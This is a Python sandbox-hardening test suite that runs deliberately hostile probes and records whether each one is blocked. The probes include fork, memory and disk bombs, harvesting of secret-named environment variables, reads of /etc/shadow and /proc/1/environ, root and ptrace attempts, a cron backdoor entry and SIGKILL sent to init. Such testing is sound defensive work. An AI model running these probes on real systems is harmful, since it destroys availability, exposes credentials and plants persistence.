#!/usr/bin/env python3
"""
Malicious Behavior Test Suite for Lambda Sandbox Research

⚠️  WARNING: These are INTENTIONALLY MALICIOUS code samples.
    DO NOT run without sandbox protection!
    
Usage:
    python3 malicious_tests.py --list          # List all tests
    python3 malicious_tests.py --run <name>    # Run specific test (DANGEROUS)
    python3 malicious_tests.py --run-all       # Run all tests (VERY DANGEROUS)
    
Safe usage (in Docker sandbox):
    docker run --rm --cap-drop=ALL ... python3 malicious_tests.py --run fork_bomb
"""

import os
import sys
import argparse
import json
from typing import Callable, Dict, Any
from dataclasses import dataclass
from datetime import datetime

# ============================================================
# SAFETY GUARD - Prevents accidental execution
# ============================================================
SAFETY_ENV_VAR = "I_KNOW_THIS_IS_DANGEROUS"

def safety_check():
    """Require explicit confirmation to run malicious code"""
    if os.environ.get(SAFETY_ENV_VAR) != "yes":
        print("=" * 60)
        print("⚠️  SAFETY GUARD ACTIVE")
        print("=" * 60)
        print("This script contains INTENTIONALLY MALICIOUS code.")
        print("Running it outside a sandbox WILL harm your system.")
        print()
        print("To run, set environment variable:")
        print(f'    export {SAFETY_ENV_VAR}=yes')
        print()
        print("Or run in Docker:")
        print('    docker run --rm --cap-drop=ALL \\')
        print('      -e I_KNOW_THIS_IS_DANGEROUS=yes \\')
        print('      -v "$(pwd):/app:ro" -w /app \\')
        print('      python:3.11-slim python3 malicious_tests.py --run <test>')
        print("=" * 60)
        sys.exit(1)

# ============================================================
# Test Registry
# ============================================================
@dataclass
class MaliciousTest:
    name: str
    category: str
    description: str
    danger_level: int  # 1-5
    func: Callable[[], Dict[str, Any]]

TESTS: Dict[str, MaliciousTest] = {}

def register_test(name: str, category: str, description: str, danger: int):
    """Decorator to register a malicious test"""
    def decorator(func):
        TESTS[name] = MaliciousTest(
            name=name,
            category=category,
            description=description,
            danger_level=danger,
            func=func
        )
        return func
    return decorator

# ============================================================
# RESOURCE EXHAUSTION ATTACKS
# ============================================================

@register_test("fork_bomb", "Resource Exhaustion", "Fork bomb - creates infinite processes", 5)
def test_fork_bomb():
    """Classic fork bomb"""
    result = {"blocked": False, "error": None, "pids_created": 0}
    try:
        for i in range(100):
            pid = os.fork()
            if pid == 0:
                # Child - just sleep
                import time
                time.sleep(60)
                os._exit(0)
            result["pids_created"] += 1
    except OSError as e:
        result["blocked"] = True
        result["error"] = str(e)
    return result

@register_test("memory_bomb", "Resource Exhaustion", "Allocate massive memory", 4)
def test_memory_bomb():
    """Try to allocate huge memory"""
    result = {"blocked": False, "error": None, "allocated_mb": 0}
    try:
        chunks = []
        for i in range(1000):  # Try 1GB in 1MB chunks
            chunks.append(b'A' * (1024 * 1024))
            result["allocated_mb"] += 1
    except MemoryError as e:
        result["blocked"] = True
        result["error"] = str(e)
    return result

@register_test("cpu_bomb", "Resource Exhaustion", "Infinite CPU loop", 3)
def test_cpu_bomb():
    """CPU exhaustion - runs for max 5 seconds then reports"""
    import time
    start = time.time()
    count = 0
    # Run for at most 5 seconds
    while time.time() - start < 5:
        count += 1
        _ = sum(range(10000))
    return {"iterations": count, "elapsed": time.time() - start}

@register_test("disk_bomb", "Resource Exhaustion", "Fill disk with data", 4)
def test_disk_bomb():
    """Try to fill /tmp with data"""
    result = {"blocked": False, "error": None, "bytes_written": 0}
    try:
        with open("/tmp/bomb.dat", "wb") as f:
            for i in range(1000):  # Try to write 1GB
                f.write(b'A' * (1024 * 1024))
                result["bytes_written"] += 1024 * 1024
    except (OSError, IOError) as e:
        result["blocked"] = True
        result["error"] = str(e)
    finally:
        try:
            os.remove("/tmp/bomb.dat")
        except:
            pass
    return result

@register_test("fd_bomb", "Resource Exhaustion", "Exhaust file descriptors", 3)
def test_fd_bomb():
    """Open as many file descriptors as possible"""
    result = {"blocked": False, "error": None, "fds_opened": 0}
    fds = []
    try:
        for i in range(100000):
            fd = os.open("/dev/null", os.O_RDONLY)
            fds.append(fd)
            result["fds_opened"] += 1
    except OSError as e:
        result["blocked"] = True
        result["error"] = str(e)
    finally:
        for fd in fds:
            try:
                os.close(fd)
            except:
                pass
    return result

# ============================================================
# INFORMATION DISCLOSURE
# ============================================================

@register_test("env_leak", "Information Disclosure", "Dump environment variables", 2)
def test_env_leak():
    """Extract environment variables"""
    sensitive_keys = ['AWS', 'SECRET', 'KEY', 'TOKEN', 'PASSWORD', 'CREDENTIAL']
    env = dict(os.environ)
    sensitive = {k: v for k, v in env.items() 
                 if any(s in k.upper() for s in sensitive_keys)}
    return {
        "total_vars": len(env),
        "sensitive_count": len(sensitive),
        "sensitive_keys": list(sensitive.keys()),
        "all_keys": list(env.keys())
    }

@register_test("proc_read", "Information Disclosure", "Read /proc filesystem", 2)
def test_proc_read():
    """Try to read sensitive /proc files"""
    result = {"accessible": [], "blocked": []}
    targets = [
        "/proc/self/status",
        "/proc/self/maps",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/1/cmdline",  # init process
        "/proc/1/environ",  # init's environment
    ]
    for path in targets:
        try:
            with open(path, "rb") as f:
                content = f.read(100)
            result["accessible"].append({"path": path, "preview": content[:50].decode('utf-8', errors='replace')})
        except (PermissionError, FileNotFoundError) as e:
            result["blocked"].append({"path": path, "error": str(e)})
    return result

@register_test("file_snoop", "Information Disclosure", "Read sensitive files", 2)
def test_file_snoop():
    """Try to read files outside sandbox"""
    result = {"accessible": [], "blocked": []}
    targets = [
        "/etc/passwd",
        "/etc/shadow",
        "/var/task/handler.py",  # Lambda function code
        "/var/runtime/bootstrap",
        "/tmp",
        "/home",
    ]
    for path in targets:
        try:
            if os.path.isdir(path):
                contents = os.listdir(path)
                result["accessible"].append({"path": path, "type": "dir", "contents": contents[:10]})
            else:
                with open(path, "r") as f:
                    content = f.read(200)
                result["accessible"].append({"path": path, "type": "file", "preview": content[:100]})
        except (PermissionError, FileNotFoundError) as e:
            result["blocked"].append({"path": path, "error": str(e)})
    return result

@register_test("tmp_snoop", "Information Disclosure", "Read previous user's /tmp files", 3)
def test_tmp_snoop():
    """Check for leftover files in /tmp from previous invocations"""
    result = {"files_found": [], "total_size": 0}
    try:
        for root, dirs, files in os.walk("/tmp"):
            for f in files:
                path = os.path.join(root, f)
                try:
                    stat = os.stat(path)
                    result["files_found"].append({
                        "path": path,
                        "size": stat.st_size,
                        "mtime": datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
                    result["total_size"] += stat.st_size
                except:
                    pass
    except Exception as e:
        result["error"] = str(e)
    return result

# ============================================================
# NETWORK ATTACKS
# ============================================================

@register_test("network_exfil", "Network", "Exfiltrate data over network", 3)
def test_network_exfil():
    """Try to connect to external server"""
    import socket
    result = {"tcp_allowed": False, "udp_allowed": False, "dns_allowed": False}
    
    # TCP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(("1.1.1.1", 80))
        s.close()
        result["tcp_allowed"] = True
    except Exception as e:
        result["tcp_error"] = str(e)
    
    # UDP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.sendto(b"test", ("1.1.1.1", 53))
        result["udp_allowed"] = True
    except Exception as e:
        result["udp_error"] = str(e)
    
    # DNS
    try:
        socket.gethostbyname("example.com")
        result["dns_allowed"] = True
    except Exception as e:
        result["dns_error"] = str(e)
    
    return result

@register_test("reverse_shell", "Network", "Attempt reverse shell connection", 5)
def test_reverse_shell():
    """Try to establish reverse shell (just tests socket, doesn't actually connect to attacker)"""
    import socket
    result = {"would_work": False, "error": None}
    try:
        # Just test if we CAN create a socket and connect
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        # Connect to localhost (safe) to test socket capability
        try:
            s.connect(("127.0.0.1", 65534))  # Unlikely to have service
        except ConnectionRefusedError:
            result["would_work"] = True  # Socket works, just no listener
            result["note"] = "Socket creation allowed - reverse shell possible"
        s.close()
    except Exception as e:
        result["error"] = str(e)
        result["note"] = "Socket creation blocked - reverse shell prevented"
    return result

# ============================================================
# PRIVILEGE ESCALATION
# ============================================================

@register_test("setuid_attempt", "Privilege Escalation", "Try to become root", 4)
def test_setuid_attempt():
    """Try various privilege escalation techniques"""
    result = {"attempts": []}
    
    # Try setuid
    try:
        os.setuid(0)
        result["attempts"].append({"method": "setuid(0)", "success": True})
    except PermissionError as e:
        result["attempts"].append({"method": "setuid(0)", "success": False, "error": str(e)})
    
    # Try setgid
    try:
        os.setgid(0)
        result["attempts"].append({"method": "setgid(0)", "success": True})
    except PermissionError as e:
        result["attempts"].append({"method": "setgid(0)", "success": False, "error": str(e)})
    
    # Check capabilities
    try:
        with open("/proc/self/status", "r") as f:
            for line in f:
                if "Cap" in line:
                    result["attempts"].append({"method": "read_caps", "value": line.strip()})
    except Exception as e:
        result["attempts"].append({"method": "read_caps", "error": str(e)})
    
    return result

@register_test("namespace_escape", "Privilege Escalation", "Try to escape namespace", 4)
def test_namespace_escape():
    """Try to unshare or enter other namespaces"""
    import ctypes
    result = {"attempts": []}
    
    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        
        # Try unshare
        CLONE_NEWNS = 0x00020000
        ret = libc.unshare(CLONE_NEWNS)
        if ret == 0:
            result["attempts"].append({"method": "unshare(NEWNS)", "success": True})
        else:
            result["attempts"].append({"method": "unshare(NEWNS)", "success": False, 
                                       "errno": ctypes.get_errno()})
    except Exception as e:
        result["attempts"].append({"method": "unshare", "error": str(e)})
    
    return result

@register_test("ptrace_attach", "Privilege Escalation", "Try to ptrace other processes", 4)
def test_ptrace_attach():
    """Try to ptrace init or other processes"""
    import ctypes
    result = {"attempts": []}
    
    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        PTRACE_ATTACH = 16
        
        # Try to attach to PID 1 (init)
        ret = libc.ptrace(PTRACE_ATTACH, 1, 0, 0)
        if ret == 0:
            result["attempts"].append({"method": "ptrace(1)", "success": True})
            # Detach
            libc.ptrace(17, 1, 0, 0)  # PTRACE_DETACH
        else:
            result["attempts"].append({"method": "ptrace(1)", "success": False,
                                       "errno": ctypes.get_errno()})
    except Exception as e:
        result["attempts"].append({"method": "ptrace", "error": str(e)})
    
    return result

# ============================================================
# PERSISTENCE
# ============================================================

@register_test("tmp_persist", "Persistence", "Write persistent file to /tmp", 2)
def test_tmp_persist():
    """Write a file that persists between invocations"""
    result = {"write_success": False, "already_exists": False}
    marker_file = "/tmp/.persistence_marker"
    
    if os.path.exists(marker_file):
        result["already_exists"] = True
        with open(marker_file, "r") as f:
            result["previous_content"] = f.read()
    
    try:
        with open(marker_file, "w") as f:
            f.write(f"Written at {datetime.now().isoformat()}")
        result["write_success"] = True
    except Exception as e:
        result["error"] = str(e)
    
    return result

@register_test("cron_inject", "Persistence", "Try to add cron job", 4)
def test_cron_inject():
    """Try to add a cron job for persistence"""
    result = {"attempts": []}
    
    cron_paths = [
        "/etc/cron.d/malicious",
        "/var/spool/cron/root",
        "/var/spool/cron/crontabs/root",
    ]
    
    for path in cron_paths:
        try:
            with open(path, "w") as f:
                f.write("* * * * * /tmp/backdoor.sh\n")
            result["attempts"].append({"path": path, "success": True})
        except Exception as e:
            result["attempts"].append({"path": path, "success": False, "error": str(e)})
    
    return result

# ============================================================
# PROCESS MANIPULATION
# ============================================================

@register_test("kill_processes", "Process Manipulation", "Try to kill other processes", 4)
def test_kill_processes():
    """Try to kill system processes"""
    import signal
    result = {"attempts": []}
    
    targets = [1, 2, 3]  # init, kthreadd, etc
    
    for pid in targets:
        try:
            os.kill(pid, signal.SIGKILL)
            result["attempts"].append({"pid": pid, "success": True})
        except ProcessLookupError:
            result["attempts"].append({"pid": pid, "success": False, "error": "No such process"})
        except PermissionError as e:
            result["attempts"].append({"pid": pid, "success": False, "error": str(e)})
    
    return result

@register_test("exec_shell", "Process Manipulation", "Try to spawn shell", 3)
def test_exec_shell():
    """Try to execute a shell"""
    import subprocess
    result = {"attempts": []}
    
    shells = ["/bin/sh", "/bin/bash", "/bin/dash", "sh"]
    
    for shell in shells:
        try:
            proc = subprocess.run([shell, "-c", "echo SUCCESS"], 
                                capture_output=True, timeout=2)
            result["attempts"].append({
                "shell": shell, 
                "success": proc.returncode == 0,
                "output": proc.stdout.decode()
            })
        except FileNotFoundError:
            result["attempts"].append({"shell": shell, "success": False, "error": "Not found"})
        except Exception as e:
            result["attempts"].append({"shell": shell, "success": False, "error": str(e)})
    
    return result

# ============================================================
# MAIN
# ============================================================

def list_tests():
    """List all available tests"""
    print("\n📋 Available Malicious Tests:\n")
    
    categories = {}
    for test in TESTS.values():
        if test.category not in categories:
            categories[test.category] = []
        categories[test.category].append(test)
    
    for category, tests in categories.items():
        print(f"[{category}]")
        for test in tests:
            danger = "🔴" * test.danger_level + "⚪" * (5 - test.danger_level)
            print(f"  {test.name:20s} {danger}  {test.description}")
        print()

def run_test(name: str):
    """Run a specific test"""
    if name not in TESTS:
        print(f"❌ Unknown test: {name}")
        print(f"   Available: {', '.join(TESTS.keys())}")
        return
    
    test = TESTS[name]
    print(f"\n🧪 Running: {test.name}")
    print(f"   Category: {test.category}")
    print(f"   Danger: {'🔴' * test.danger_level}")
    print(f"   Description: {test.description}")
    print("-" * 50)
    
    try:
        result = test.func()
        print(json.dumps(result, indent=2, default=str))
    except Exception as e:
        print(f"❌ Test crashed: {e}")

def run_all():
    """Run all tests"""
    results = {}
    for name, test in TESTS.items():
        print(f"\n🧪 {name}...", end=" ", flush=True)
        try:
            result = test.func()
            results[name] = {"status": "completed", "result": result}
            print("✓")
        except Exception as e:
            results[name] = {"status": "crashed", "error": str(e)}
            print(f"✗ ({e})")
    
    print("\n" + "=" * 50)
    print("RESULTS SUMMARY")
    print("=" * 50)
    print(json.dumps(results, indent=2, default=str))

def main():
    parser = argparse.ArgumentParser(description="Malicious Behavior Test Suite")
    parser.add_argument("--list", action="store_true", help="List all tests")
    parser.add_argument("--run", type=str, help="Run specific test")
    parser.add_argument("--run-all", action="store_true", help="Run all tests")
    
    args = parser.parse_args()
    
    if args.list:
        list_tests()
        return
    
    if args.run or args.run_all:
        safety_check()  # Require confirmation
        
        if args.run:
            run_test(args.run)
        elif args.run_all:
            run_all()
        return
    
    # Default: show help
    parser.print_help()
    print("\nℹ️  Use --list to see available tests")

if __name__ == "__main__":
    main()
